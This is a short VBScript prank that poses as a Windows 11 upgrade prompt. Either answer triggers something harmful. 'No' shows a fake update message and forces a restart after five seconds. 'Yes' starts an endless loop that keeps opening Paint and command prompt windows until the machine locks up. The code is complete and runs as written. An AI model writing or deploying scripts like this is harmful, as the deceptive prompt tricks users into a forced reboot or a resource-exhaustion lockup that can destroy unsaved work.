Dim action
action = MsgBox ("Do you want to upgrade to Windows 11?", vbYesNo, "Upgrade Windows")
Select Case action
    Case vbNo
        MsgBox("Windows will now restart to finish updates.")
        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 5"
    Case vbYes
        MsgBox("You've been tricked!!" & vbCrLf & "Windows will now auto destruct!")
	Set objShell = WScript.CreateObject("WScript.Shell")
	do
        objShell.Run "C:\WINDOWS\system32\mspaint.exe"
	objShell.Run "C:\WINDOWS\system32\cmd.exe"
	loop
End Select